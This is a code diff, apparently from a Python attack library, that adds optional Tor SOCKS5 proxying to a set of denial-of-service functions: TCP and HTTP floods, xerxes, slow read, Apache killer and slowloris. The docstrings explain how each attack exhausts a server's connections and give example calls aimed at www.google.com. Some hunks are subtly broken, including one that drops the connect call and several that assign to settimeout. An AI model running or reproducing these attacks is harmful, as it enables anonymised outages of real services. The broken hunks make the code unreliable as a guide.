@@ -104,7 +104,10 @@ class tcflood(threading.Thread):
   global stop
   while (stop!=True):
    try:
-    s =socket.socket()
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout=(timeout)
+    if tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.settimeout(timeout)
     s.connect((target,port))
     if (port==443) or (port==8443):
@@ -139,7 +142,9 @@ class tcflood(threading.Thread):
   threads: (set by default to: 256) threads to use
   maxtime: (set by default to: 5) timeout flag
 '''
-def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False):
+def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+ global tor
+ tor=settor
  global stop
  stop=False
  global prints
@@ -191,7 +196,10 @@ class htflood(threading.Thread):
   global counter
   while (stop!=True):
    try:
-    s =socket.socket()
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout=(timeout)
+    if tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.settimeout(timeout)
     s.connect((target,port))
     if ((port==443) or (port==8443)):
@@ -258,7 +266,7 @@ class htflood(threading.Thread):
 
    there will be lessons how to use them all don't worry guys xD
 '''
-def httpflood(u,p=80,threads=256,maxtime=5,ampli=15,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False):
+def httpflood(u,p=80,threads=256,maxtime=5,ampli=15,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
  '''
    this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
    it takes the following parameters:
@@ -274,6 +282,8 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=15,roundmin=5,roundmax=15,level
    >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)
 
 '''
+ global tor
+ tor=settor
  global stop
  stop=False
  global target
@@ -605,7 +615,10 @@ class xer(threading.Thread):
   x=pointer
   while (stop!=True):
    try:
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout=(timeout)
+    if tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.settimeout(timeout)
     s.connect((target,port))
     if prints==True:
@@ -621,7 +634,7 @@ class xer(threading.Thread):
    except:
     pass
    time.sleep(.3)
-def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True):
+def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
  '''
    everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.
 
@@ -640,6 +653,8 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True):
   >>>bane.xerxes('www.google.com',threads=256)
 
 '''
+ global tor
+ tor=settor
  global stop
  stop=False
  global prints
@@ -670,7 +685,10 @@ class slrd(threading.Thread):
  def run(self):
   while (stop!=True):
    try: 
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout=(timeout)
+    if tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.settimeout(timeout)
     s.connect((target,port))
     if ((port==443)or(port==8443)):
@@ -695,7 +713,7 @@ class slrd(threading.Thread):
     s.close()
    except Exception as e:
     pass
-def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs=True):
+def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs=True,settor=False):
  '''
    this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.
 
@@ -712,6 +730,8 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
    >>>bane.slowread('www.google.com',p=443,threads=300,maxtime=7)
 
 '''
+ global tor
+ tor=settor
  global stop
  stop=False
  global prints
@@ -751,7 +771,10 @@ class apa(threading.Thread):
     apache="5-0"
     for x in range(1,random.randint(1200,1300)):
      apache+=',5-'+str(x)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout=(timeout)
+    if tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((target, port))
     if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
@@ -765,7 +788,7 @@ class apa(threading.Thread):
       print'Requests sent: {}'.format(counter)
    except:
     pass
-def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False):
+def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
  '''
    this is a python version of the apache killer tool which was originally written in perl.
 
@@ -782,6 +805,8 @@ def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,int
    >>>bane.apachekiller('www.google.com',p=80)
 
 '''
+ global tor
+ tor=settor
  global stop
  stop=False
  global prints
@@ -832,7 +857,10 @@ class loris(threading.Thread):
    try:
     s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
-    s.connect((target,port))
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout=(timeout)
+    if tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
@@ -855,7 +883,7 @@ class loris(threading.Thread):
     sys.stdout.write("\r\tSockets alive: {}".format(counter))
     sys.stdout.flush()
   ls=[]
-def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True):
+def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
  '''
    this function is for advanced slowloris attack. here this script is acting differently, it uses the threads to consume the target's available connections but without connections' count limit, so it keeps consuming the server's connections till it becomes unavailable.
    on each thread, it opens a connection, sends a partial HTTP request then it append it to a list, it continue doing this without stopping even if the target is down and all of this after each try to open new connection it sends random X-a: header value to keep all created connections open without reaching the timeout value.
@@ -868,6 +896,8 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True):
    maxtime: (set by default to: 5) connection timeout flag 
 
 '''
+ global tor
+ tor=settor
  global stop
  stop=False
  global prints
